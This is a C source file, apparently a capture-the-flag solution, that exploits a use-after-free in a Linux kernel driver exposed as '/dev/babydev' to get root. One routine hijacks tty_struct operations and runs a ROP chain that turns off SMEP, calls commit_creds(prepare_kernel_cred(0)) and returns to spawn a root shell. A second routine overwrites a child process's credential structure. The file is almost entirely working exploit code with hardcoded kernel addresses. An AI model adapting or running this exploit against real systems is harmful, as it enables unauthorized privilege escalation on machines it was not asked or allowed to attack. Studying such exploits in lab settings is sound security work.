#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>

#define bp scanf("%*c")
#define prepare_kernel_cred 0xffffffff810a1810
#define commit_creds 0xffffffff810a1420

long num[0x100];
char *buf = (char *)num;

void get_shell(void){
    puts("[*] Returned to userland");
    if (getuid() == 0){
        printf("[*] UID: %d, GID: %d, got root!\n", getuid(), getgid());
        char *args[]={"/bin/sh",NULL}; 
        execve("/bin/sh",args,NULL);
        exit(1337);
    } else {
        printf("[!] UID: %d, didn't get root\n", getuid());
        exit(-1);
    }
}

long user_cs;
long user_ss;
long user_sp;
long user_rflags;
void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[*] Saved state");
}

void get_root()
{
 char* (*pkc)(int) = prepare_kernel_cred;
 void (*cc)(char*) = commit_creds;
 (*cc)((*pkc)(0));
}

void exploit1()
{
    // Get UAF in 0x400 chunk(size of tty_struct), hijack tty_operations to get RIP control
    // Then turn off SMEP(optional, could've used ROP to accomplish the same)\
    // Run commit_creds(prepare_kernel_cred(0)) to escalate.
    // Safely return to userland and invoke shell ðŸ™‚
    save_state();
    int fd = open("/dev/babydev", O_RDWR);
    int fd2 = open("/dev/babydev", O_RDWR);
    int i = 0;
    ioctl(fd2, 0x10001, 0x2e0);
    close(fd2);
    int fd_tty = open("/dev/ptmx", O_RDWR|O_NOCTTY);
    read(fd, buf, 0x2e0-1);

    long * fake_stack = (long*)mmap(0x5d000000, 0x3000, PROT_READ|PROT_WRITE, MAP_ANON|MAP_SHARED, -1, 0);
    *(long *)((long)fake_stack + 0x0000) = 0;
    *(long *)((long)fake_stack + 0x1000) = 0;
    *(long *)((long)fake_stack + 0x2000) = 0;
    long * _stack = (long *)((long)fake_stack + 0x0558);

    i = 0;
    // _stack[i++] = 0x4141414141414141;
    _stack[i++] = 0xffffffff810d238d;    // pop rdi ; ret
    _stack[i++] = 0x6f0;
    _stack[i++] = 0xffffffff81004d80;    // mov cr4, rdi ; pop rbp ; ret
    _stack[i++] = 0;
    _stack[i++] = get_root;
    _stack[i++] = 0xffffffff81063694;    // swapgs ; pop rbp ; ret
    _stack[i++] = 0x1337;
    _stack[i++] = 0xffffffff8181a797;    // iretq
    _stack[i++] = get_shell;
    _stack[i++] = user_cs;
    _stack[i++] = user_rflags;
    _stack[i++] = user_sp;
    _stack[i++] = user_ss;

    long fake_ptrs[100];
    fake_ptrs[12] = 0xffffffff81391fb0; // mov esp, 0x5bffffc8 ; pop rbp ; ret

    num[3] = fake_ptrs;
    write(fd, buf, 0x20);

    ioctl(fd_tty, buf, 8);
    puts("[+] Checkpointrrrrrrrr");
    return;
}

void exploit2()
{
	// Get UAF in 0xa8 chunk(size of cred) and fork to get cred overwrite in child process
	int fd = open("/dev/babydev", O_RDWR);
	int fd2 = open("/dev/babydev", O_RDWR);
	ioctl(fd2, 0x10001, 0xa8);
	close(fd2);
	pid_t p = fork();
	if (p == 0)
	{
		// Child
		memset(buf, 0, 0x40);
		write(fd, buf, 10);
		get_shell();
	}
	else
	{
		// Parent
		wait(NULL);
	}
	return;
}

int main()
{
    exploit1();
    return 0;
}